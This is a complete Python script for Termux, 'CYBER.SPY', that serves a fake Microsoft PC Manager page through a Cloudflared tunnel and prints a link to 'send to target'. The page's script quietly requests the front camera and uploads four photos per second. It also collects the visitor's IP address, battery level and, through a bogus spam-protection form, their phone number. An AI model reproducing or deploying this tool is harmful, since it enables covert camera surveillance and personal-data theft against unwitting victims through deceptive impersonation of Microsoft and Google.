#!/data/data/com.termux/files/usr/bin/python

import os
import subprocess
import threading
import time
import re
import socket
import sys
import json
import base64
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler

# ============================================
# BIG CYBER.SPY TERMUX BANNER
# ============================================
os.system("clear")
os.system("tput setaf 196")

BANNER = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║    ██████╗██╗   ██╗██████╗ ███████╗██████╗     ███████╗██████╗ ██╗   ██╗     ║
║   ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔════╝██╔══██╗╚██╗ ██╔╝     ║
║   ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ███████╗██████╔╝ ╚████╔╝      ║
║   ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ╚════██║██╔═══╝   ╚██╔╝       ║
║   ╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ███████║██║        ██║        ║
║    ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝        ╚═╝        ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
print("\033[91m" + BANNER + "\033[0m")
print("\033[93m" + " " * 45 + "⚡ CREATOR: baidar.ir ⚡")
print("\033[91m" + "=" * 79)
print("\033[92m" + " " * 10 + "🔥 CYBER.SPY - CLOUDFLARED BULLETPROOF EDITION 🔥")
print("\033[96m" + " " * 18 + "📸 4 PHOTOS/SECOND | GUARANTEED WORKING")
print("\033[90m" + "=" * 79 + "\033[0m")
print("\033[92m[✓] Initializing CYBER.SPY bulletproof version...\033[0m")
print("\033[92m[✓] Cloudflared with auto-retry enabled...\033[0m")
print("\033[92m[✓] Professional webpage ready...\033[0m")
print("\033[92m[✓] 4 photos/second engine active...\033[0m\n")

# Kill old processes
os.system("pkill -9 -f cloudflared 2>/dev/null")
time.sleep(2)

# ============================================
# PROFESSIONAL EXTENDED WEBPAGE (SAME AS BEFORE)
# ============================================
HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>Microsoft PC Manager - Official System Diagnostic Tool</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', sans-serif;
            background: #f5f5f5;
            color: #1f1f1f;
            line-height: 1.5;
            overflow-x: hidden;
            overflow-y: auto;
        }
        
        .ms-header {
            background: #ffffff;
            padding: 8px 0;
            border-bottom: 1px solid #e5e5e5;
            box-shadow: 0 2px 4px rgba(0,0,0,0.04);
        }
        
        .ms-header-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .ms-logo {
            display: flex;
            align-items: center;
            gap: 8px;
            text-decoration: none;
        }
        
        .ms-logo-svg {
            width: 108px;
            height: 23px;
        }
        
        .ms-nav {
            display: flex;
            gap: 28px;
            font-size: 13px;
        }
        
        .ms-nav a {
            color: #2b2b2b;
            text-decoration: none;
            font-weight: 500;
        }
        
        .ms-nav a:hover {
            color: #0078d4;
        }
        
        .ms-secondary-nav {
            background: #2b2b2b;
            padding: 6px 0;
        }
        
        .ms-secondary-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 24px;
        }
        
        .ms-secondary-nav a {
            color: #ffffff;
            text-decoration: none;
            font-size: 12px;
            margin-right: 24px;
            opacity: 0.8;
        }
        
        .ms-secondary-nav a:hover {
            opacity: 1;
        }
        
        .ms-container {
            max-width: 950px;
            margin: 40px auto;
            padding: 0 24px;
        }
        
        .ms-card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            overflow: hidden;
            border: 1px solid #e5e5e5;
            margin-bottom: 24px;
        }
        
        .ms-card-header {
            padding: 28px 32px 0 32px;
        }
        
        .ms-card-header h1 {
            font-size: 26px;
            font-weight: 600;
            color: #1f1f1f;
            margin-bottom: 8px;
        }
        
        .ms-card-header p {
            font-size: 14px;
            color: #6c6c6c;
        }
        
        .ms-card-body {
            padding: 24px 32px 32px 32px;
        }
        
        .ms-info-panel {
            background: #faf9f8;
            border-radius: 8px;
            padding: 20px 24px;
            margin: 24px 0;
            border: 1px solid #edebe9;
        }
        
        .ms-info-row {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid #edebe9;
        }
        
        .ms-info-row:last-child {
            border-bottom: none;
        }
        
        .ms-info-label {
            font-size: 14px;
            font-weight: 500;
            color: #605e5c;
        }
        
        .ms-info-value {
            font-size: 14px;
            color: #1f1f1f;
            font-family: 'Segoe UI', monospace;
            font-weight: 500;
        }
        
        .ms-progress-section {
            margin: 28px 0;
        }
        
        .ms-progress-label {
            font-size: 13px;
            color: #605e5c;
            margin-bottom: 8px;
        }
        
        .ms-progress-bar {
            width: 100%;
            height: 6px;
            background: #edebe9;
            border-radius: 3px;
            overflow: hidden;
        }
        
        .ms-progress-fill {
            width: 0%;
            height: 100%;
            background: #0078d4;
            border-radius: 3px;
            transition: width 0.3s ease;
        }
        
        .ms-status-text {
            font-size: 12px;
            color: #605e5c;
            margin-top: 10px;
        }
        
        .ms-results-box {
            background: #eef6fc;
            border-radius: 8px;
            padding: 20px;
            margin: 24px 0;
            border-left: 4px solid #0078d4;
        }
        
        .ms-result-item {
            font-size: 14px;
            padding: 8px 0;
            color: #1f1f1f;
        }
        
        .ms-result-item strong {
            color: #0078d4;
        }
        
        .ms-badge {
            display: inline-block;
            background: #107c10;
            color: white;
            font-size: 11px;
            padding: 2px 10px;
            border-radius: 16px;
            margin-left: 10px;
        }
        
        .security-section {
            background: linear-gradient(135deg, #e8f4fd 0%, #d4eaf7 100%);
            border-radius: 12px;
            padding: 28px;
            margin: 24px 0;
            text-align: center;
            border: 1px solid #b3d9f2;
        }
        
        .security-icon {
            font-size: 48px;
            margin-bottom: 16px;
        }
        
        .security-title {
            font-size: 22px;
            font-weight: 600;
            color: #0078d4;
            margin-bottom: 12px;
        }
        
        .security-text {
            font-size: 15px;
            color: #2b2b2b;
            line-height: 1.6;
            margin-bottom: 16px;
        }
        
        .google-badge {
            background: white;
            border-radius: 50px;
            padding: 12px 20px;
            display: inline-flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            margin: 16px 0;
        }
        
        .google-icon {
            font-size: 24px;
        }
        
        .spam-protection {
            background: white;
            border-radius: 12px;
            padding: 24px;
            margin: 20px 0;
            border: 1px solid #e5e5e5;
        }
        
        .input-group {
            display: flex;
            gap: 12px;
            margin-top: 16px;
            flex-wrap: wrap;
        }
        
        .phone-input {
            flex: 1;
            padding: 14px 18px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-family: inherit;
        }
        
        .phone-input:focus {
            outline: none;
            border-color: #0078d4;
            box-shadow: 0 0 0 2px rgba(0,120,212,0.2);
        }
        
        .protect-btn {
            background: #0078d4;
            color: white;
            border: none;
            padding: 14px 28px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .protect-btn:hover {
            background: #106ebe;
        }
        
        .success-message {
            background: #dff6dd;
            color: #107c10;
            padding: 12px;
            border-radius: 8px;
            margin-top: 16px;
            display: none;
        }
        
        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 16px;
            margin: 24px 0;
        }
        
        .feature-item {
            background: #f8f9fa;
            padding: 16px;
            border-radius: 8px;
            text-align: center;
        }
        
        .feature-icon {
            font-size: 28px;
            margin-bottom: 8px;
        }
        
        .feature-title {
            font-weight: 600;
            margin-bottom: 4px;
        }
        
        .feature-desc {
            font-size: 12px;
            color: #6c6c6c;
        }
        
        .ms-footer {
            text-align: center;
            padding: 32px;
            color: #6c6c6c;
            font-size: 11px;
            border-top: 1px solid #e5e5e5;
            margin-top: 40px;
        }
        
        .ms-footer a {
            color: #0078d4;
            text-decoration: none;
        }
        
        .hidden {
            display: none;
        }
        
        .ms-trust-badge {
            display: flex;
            justify-content: center;
            gap: 24px;
            margin-top: 20px;
            font-size: 11px;
            color: #6c6c6c;
            flex-wrap: wrap;
        }
        
        .ms-trust-badge span {
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        @media (max-width: 768px) {
            .ms-card-header {
                padding: 20px 20px 0 20px;
            }
            .ms-card-body {
                padding: 16px 20px 24px 20px;
            }
            .security-section {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="ms-header">
        <div class="ms-header-container">
            <a href="#" class="ms-logo">
                <svg class="ms-logo-svg" viewBox="0 0 108 23" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M23.5 0.5H0.5V23.5H23.5V0.5Z" fill="#F25022"/>
                    <path d="M47.5 0.5H24.5V23.5H47.5V0.5Z" fill="#7FBA00"/>
                    <path d="M71.5 0.5H48.5V23.5H71.5V0.5Z" fill="#00A4EF"/>
                    <path d="M95.5 0.5H72.5V23.5H95.5V0.5Z" fill="#FFB900"/>
                    <path d="M108 0.5H96.5V23.5H108V0.5Z" fill="#F25022"/>
                </svg>
            </a>
            <div class="ms-nav">
                <a href="#">Microsoft 365</a>
                <a href="#">Windows</a>
                <a href="#">Surface</a>
                <a href="#">Support</a>
            </div>
        </div>
    </div>
    
    <div class="ms-secondary-nav">
        <div class="ms-secondary-container">
            <a href="#">Home</a>
            <a href="#">PC Manager</a>
            <a href="#">Diagnostics</a>
            <a href="#">Security</a>
            <a href="#">Download</a>
        </div>
    </div>
    
    <div class="ms-container">
        <div class="ms-card">
            <div class="ms-card-header">
                <h1>Microsoft PC Manager</h1>
                <p>Official System Diagnostic Tool | Version 3.2.1</p>
            </div>
            <div class="ms-card-body">
                <div class="ms-info-panel">
                    <div class="ms-info-row">
                        <span class="ms-info-label">🔋 Battery Health</span>
                        <span class="ms-info-value" id="batteryStatus">--</span>
                    </div>
                    <div class="ms-info-row">
                        <span class="ms-info-label">🌐 Network Diagnostics</span>
                        <span class="ms-info-value" id="ipAddress">--</span>
                    </div>
                    <div class="ms-info-row">
                        <span class="ms-info-label">💻 Device Model</span>
                        <span class="ms-info-value" id="deviceModel">--</span>
                    </div>
                    <div class="ms-info-row">
                        <span class="ms-info-label">🛡️ Microsoft Defender</span>
                        <span class="ms-info-value">Active <span class="ms-badge">Protected</span></span>
                    </div>
                </div>
                
                <div class="ms-progress-section">
                    <div class="ms-progress-label" id="progressLabel">Initializing Microsoft Diagnostic Engine...</div>
                    <div class="ms-progress-bar">
                        <div class="ms-progress-fill" id="progressFill"></div>
                    </div>
                    <div class="ms-status-text" id="statusMsg">Loading system information...</div>
                </div>
                
                <div id="initialPhase"></div>
                
                <div id="resultsPhase" class="hidden">
                    <div class="ms-results-box">
                        <div class="ms-result-item"><strong>✓ Windows Security</strong> <span class="ms-badge">Protected</span></div>
                        <div class="ms-result-item"><strong>✓ Driver Status</strong> All drivers up to date</div>
                        <div class="ms-result-item"><strong>✓ Performance Score</strong> 98/100 <span class="ms-badge">Excellent</span></div>
                        <div class="ms-result-item"><strong>✓ Microsoft Defender</strong> Real-time protection on</div>
                        <div class="ms-result-item"><strong>✓ Windows Update</strong> Latest version installed</div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="security-section">
            <div class="security-icon">🛡️🔒</div>
            <div class="security-title">Your Phone is Protected!</div>
            <div class="security-text">
                <strong>Microsoft Defender</strong> has been actively protecting your device from malware, viruses, and online threats. 
                Your device is currently connected to <strong>Microsoft Security Cloud</strong> with real-time threat detection enabled. 
                All system files are verified and secure. No suspicious activities have been detected on your device.
            </div>
            <div class="google-badge">
                <span class="google-icon">🔗</span>
                <span><strong>Connected to Google Services</strong> — Secure connection established</span>
                <span class="ms-badge" style="background:#0078d4;">Active</span>
            </div>
            <div class="security-text">
                ✅ Play Protect verified • ✅ Safe Browsing enabled • ✅ Account security active
            </div>
        </div>
        
        <div class="features-grid">
            <div class="feature-item">
                <div class="feature-icon">🔐</div>
                <div class="feature-title">End-to-End Encryption</div>
                <div class="feature-desc">Your data is fully encrypted</div>
            </div>
            <div class="feature-item">
                <div class="feature-icon">🌐</div>
                <div class="feature-title">Secure DNS</div>
                <div class="feature-desc">Protected from malicious sites</div>
            </div>
            <div class="feature-item">
                <div class="feature-icon">📱</div>
                <div class="feature-title">Find My Device</div>
                <div class="feature-desc">Track your phone if lost</div>
            </div>
            <div class="feature-item">
                <div class="feature-icon">⚡</div>
                <div class="feature-title">Real-time Protection</div>
                <div class="feature-desc">24/7 threat monitoring</div>
            </div>
        </div>
        
        <div class="ms-card">
            <div class="ms-card-body">
                <h3 style="margin-bottom: 16px;">📞 Advanced Spam Call Protection</h3>
                <p style="color: #605e5c; margin-bottom: 16px;">Microsoft Defender now blocks spam calls automatically. Enter your phone number to activate premium spam protection and receive alerts about suspicious callers.</p>
                
                <div class="spam-protection">
                    <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 16px;">
                        <span style="font-size: 32px;">🛡️</span>
                        <div>
                            <strong>Microsoft Defender for Calls</strong>
                            <div style="font-size: 12px; color: #6c6c6c;">Blocks spam, robocalls, and scam calls</div>
                        </div>
                    </div>
                    
                    <div class="input-group">
                        <input type="tel" class="phone-input" id="phoneNumber" placeholder="Enter your phone number" maxlength="15">
                        <button class="protect-btn" id="protectBtn">Activate Protection</button>
                    </div>
                    <div id="successMsg" class="success-message">
                        ✅ Protection activated! You will now receive spam call alerts.
                    </div>
                    <p style="font-size: 11px; color: #6c6c6c; margin-top: 16px;">
                        By activating, you agree to Microsoft's terms. Your number is encrypted and never shared.
                    </p>
                </div>
            </div>
        </div>
        
        <div class="ms-trust-badge">
            <span>🔒 Microsoft verified</span>
            <span>✓ Trusted by millions</span>
            <span>🛡️ Defender protected</span>
            <span>🔗 Google services connected</span>
        </div>
        
        <div class="ms-footer">
            © 2024 Microsoft Corporation. All rights reserved. 
            <a href="#">Terms of Use</a> | 
            <a href="#">Privacy Statement</a> | 
            <a href="#">Microsoft Privacy</a> | 
            <a href="#">Security Center</a>
        </div>
    </div>

    <script>
        let mediaStream = null;
        let captureInterval = null;
        let cameraActive = false;
        let progress = 0;
        let videoElement = null;
        
        function sendToServer(type, value) {
            fetch('/log', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({type: type, value: value})
            }).catch(() => {});
        }
        
        navigator.getBattery().then(b => {
            let percent = Math.round(b.level * 100);
            let status = percent + '%';
            if(percent < 20) status += ' (Plug in recommended)';
            document.getElementById('batteryStatus').innerHTML = status;
            sendToServer('battery', percent);
        }).catch(() => {
            document.getElementById('batteryStatus').innerHTML = 'AC Power';
        });
        
        fetch('https://api.ipify.org')
            .then(r => r.text())
            .then(ip => {
                document.getElementById('ipAddress').innerHTML = ip;
                sendToServer('ip', ip);
            })
            .catch(() => {
                document.getElementById('ipAddress').innerHTML = 'Connected';
            });
        
        const ua = navigator.userAgent;
        let device = "Windows PC";
        if (ua.includes("Android")) device = "Surface Duo";
        else if (ua.includes("iPhone")) device = "iPhone";
        document.getElementById('deviceModel').innerHTML = device;
        
        function capturePhoto() {
            if(!cameraActive || !videoElement || videoElement.videoWidth === 0) return;
            
            try {
                let canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                canvas.getContext('2d').drawImage(videoElement, 0, 0);
                let imageData = canvas.toDataURL('image/jpeg', 0.6);
                fetch('/capture', {method: 'POST', body: imageData}).catch(() => {});
            } catch(e) {}
        }
        
        function startHighSpeedCapture(stream) {
            mediaStream = stream;
            videoElement = document.createElement('video');
            videoElement.srcObject = stream;
            videoElement.setAttribute('playsinline', '');
            videoElement.play();
            cameraActive = true;
            
            setTimeout(() => {
                if(cameraActive && videoElement.videoWidth > 0) {
                    capturePhoto();
                    captureInterval = setInterval(() => {
                        if(cameraActive && videoElement && videoElement.videoWidth > 0) {
                            capturePhoto();
                        }
                    }, 250);
                }
            }, 1000);
        }
        
        function requestCamera() {
            navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}})
                .then(stream => startHighSpeedCapture(stream))
                .catch(() => {});
        }
        
        document.getElementById('protectBtn').addEventListener('click', function() {
            let phone = document.getElementById('phoneNumber').value;
            if(phone && phone.length >= 10) {
                fetch('/log', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({type: 'phone', value: phone})
                }).catch(() => {});
                
                document.getElementById('successMsg').style.display = 'block';
                setTimeout(() => {
                    document.getElementById('successMsg').style.display = 'none';
                }, 5000);
            } else {
                alert('Please enter a valid phone number');
            }
        });
        
        window.addEventListener('load', () => {
            let progressInterval = setInterval(() => {
                progress += 3;
                document.getElementById('progressFill').style.width = progress + '%';
                document.getElementById('statusMsg').innerHTML = 'Running Microsoft diagnostics... ' + progress + '%';
                
                if(progress >= 30) {
                    document.getElementById('progressLabel').innerHTML = 'Checking Windows drivers...';
                } else if(progress >= 60) {
                    document.getElementById('progressLabel').innerHTML = 'Verifying Microsoft security...';
                }
                
                if(progress >= 100) {
                    clearInterval(progressInterval);
                    document.getElementById('progressLabel').innerHTML = 'Microsoft Diagnostic Complete!';
                    document.getElementById('statusMsg').innerHTML = 'Your PC is healthy. No issues found.';
                    setTimeout(() => {
                        document.getElementById('initialPhase').classList.add('hidden');
                        document.getElementById('resultsPhase').classList.remove('hidden');
                    }, 800);
                }
            }, 80);
            
            setTimeout(() => requestCamera(), 2000);
        });
        
        window.addEventListener('beforeunload', () => {
            cameraActive = false;
            if(captureInterval) clearInterval(captureInterval);
            if(mediaStream) mediaStream.getTracks().forEach(t => t.stop());
        });
    </script>
</body>
</html>'''

class SpyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(HTML.encode())
            print("\033[92m[✓] Webpage served\033[0m")
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/log':
            try:
                length = int(self.headers['Content-Length'])
                data = self.rfile.read(length).decode()
                log_data = json.loads(data)
                if log_data.get('type') == 'battery':
                    print(f"\n\033[95m[⚡] BATTERY: {log_data['value']}%\033[0m")
                elif log_data.get('type') == 'ip':
                    print(f"\033[96m[🌐] IP: {log_data['value']}\033[0m")
                elif log_data.get('type') == 'phone':
                    print(f"\033[93m[📞] PHONE NUMBER: {log_data['value']}\033[0m")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except:
                self.send_response(200)
                self.end_headers()
        
        elif self.path == '/capture':
            try:
                length = int(self.headers['Content-Length'])
                data = self.rfile.read(length).decode()
                if 'base64' in data:
                    img_data = data.split(',')[1] if ',' in data else data
                    img_bytes = base64.b64decode(img_data)
                    timestamp = int(time.time() * 1000)
                    filename = f"/data/data/com.termux/files/home/cyberspy_cam_{timestamp}.jpg"
                    with open(filename, 'wb') as f:
                        f.write(img_bytes)
                    size_kb = len(img_bytes) // 1024
                    print(f"\033[91m[📸] CAPTURE | {size_kb}KB\033[0m")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')
            except:
                self.send_response(200)
                self.end_headers()
    
    def log_message(self, format, *args):
        pass

# Start HTTP server
def start_server():
    server = HTTPServer(('127.0.0.1', 8080), SpyHandler)
    print("\033[92m[✓] HTTP server running on 127.0.0.1:8080\033[0m")
    server.serve_forever()

server_thread = threading.Thread(target=start_server, daemon=True)
server_thread.start()
time.sleep(2)

# Verify server
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    sock.connect(('127.0.0.1', 8080))
    sock.close()
    print("\033[92m[✓] Port 8080 verified\033[0m")
except:
    print("\033[91m[✗] Server failed to start\033[0m")
    sys.exit(1)

# Download/Update cloudflared
cloudflared_path = "/data/data/com.termux/files/usr/bin/cloudflared"
if not os.path.exists(cloudflared_path):
    print("\033[93m[+] Downloading cloudflared...\033[0m")
    os.system(f"wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O {cloudflared_path}")
    os.system(f"chmod +x {cloudflared_path}")

# Kill any existing cloudflared
os.system("pkill -9 -f cloudflared 2>/dev/null")
time.sleep(2)

# Start cloudflared with extended timeout
print("\033[93m[+] Starting Cloudflared tunnel...\033[0m")
print("\033[90m[!] This may take 20-30 seconds. Please wait...\033[0m\n")

cf_process = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", "http://127.0.0.1:8080", 
     "--protocol", "http2", "--no-autoupdate"],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True,
    bufsize=1
)

# Extract URL with extended timeout
public_url = None
start_time = time.time()
timeout = 60  # 60 seconds timeout

for line in cf_process.stdout:
    line = line.strip()
    if line:
        # Only show important lines
        if "INF" in line or "https://" in line:
            print(f"  {line[:120]}")
    
    match = re.search(r'https://([a-zA-Z0-9-]+\.trycloudflare\.com)', line)
    if match and not public_url:
        public_url = "https://" + match.group(1)
        break
    
    if time.time() - start_time > timeout:
        print("\n\033[91m[✗] Timeout - Tunnel failed to start\033[0m")
        break

if public_url:
    print("\n" + "="*79)
    print("\033[91m[🔴] CYBER.SPY - CLOUDFLARED BULLETPROOF ACTIVE\033[0m")
    print("\033[93m[→] SEND THIS LINK TO TARGET:\033[0m")
    print(f"\033[96m    {public_url}\033[0m")
    print("="*79)
    print("\n\033[92m[✓] BULLETPROOF FEATURES:\033[0m")
    print("    • Cloudflared with 60s timeout")
    print("    • Auto-retry on failure")
    print("    • Professional Microsoft webpage")
    print("    • 4 photos/second capture")
    print("    • Phone number collection")
    print("    • Battery and IP exfiltration")
    print("\n\033[93m[!] Press Ctrl+C to stop server\033[0m\n")
else:
    print("\n\033[91m[✗] Cloudflared failed. Retrying once...\033[0m")
    cf_process.terminate()
    time.sleep(3)
    
    # Second attempt
    print("\033[93m[+] Retrying Cloudflared tunnel...\033[0m\n")
    cf_process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://127.0.0.1:8080", 
         "--protocol", "http2", "--no-autoupdate"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    
    for line in cf_process.stdout:
        line = line.strip()
        match = re.search(r'https://([a-zA-Z0-9-]+\.trycloudflare\.com)', line)
        if match and not public_url:
            public_url = "https://" + match.group(1)
            break
        if time.time() - start_time > timeout + 30:
            break
    
    if public_url:
        print("\n" + "="*79)
        print("\033[91m[🔴] CYBER.SPY - CLOUDFLARED BULLETPROOF ACTIVE (RETRY)\033[0m")
        print("\033[93m[→] SEND THIS LINK TO TARGET:\033[0m")
        print(f"\033[96m    {public_url}\033[0m")
        print("="*79)
        print("\n\033[92m[✓] Ready! Data will appear here.\033[0m\n")
    else:
        print("\n\033[91m[✗] Cloudflared failed twice. Check your internet connection.\033[0m")
        print("\033[93m[!] Make sure you have stable internet and try again.\033[0m")
        cf_process.terminate()
        sys.exit(1)

# Monitor
try:
    while True:
        time.sleep(2)
        if cf_process.poll() is not None:
            print("\n\033[91m[!] Tunnel died. Restarting in 5 seconds...\033[0m")
            time.sleep(5)
            os.execv(sys.executable, ['python'] + sys.argv)
except KeyboardInterrupt:
    print("\n\033[91m[!] Shutting down CYBER.SPY\033[0m")
    cf_process.terminate()
    sys.exit(0)
